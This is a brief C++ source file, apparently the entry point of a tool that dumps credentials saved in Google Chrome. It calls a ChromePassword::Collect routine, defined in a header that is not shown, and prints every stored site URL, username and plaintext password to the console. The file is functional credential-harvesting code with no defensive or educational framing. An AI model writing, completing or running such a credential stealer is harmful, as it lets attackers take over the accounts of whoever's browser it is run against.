#include "utils.hpp"
#include "ChromePassword.hpp"

int main()
{
    std::vector<struct ChromePassword::user_data> user_data_list;
    ChromePassword::Collect(user_data_list);

    for (const ChromePassword::user_data &user : user_data_list) {

        std::string url = user.action_url;
        std::string username = user.username_value;
        std::string password = user.password_value;

        std::cout << "--------------------\nURL: " << url << "\n";
        std::cout << "Username: " << username << "\n";
        std::cout << "Password: " << password << "\n--------------------\n\n";
    }
}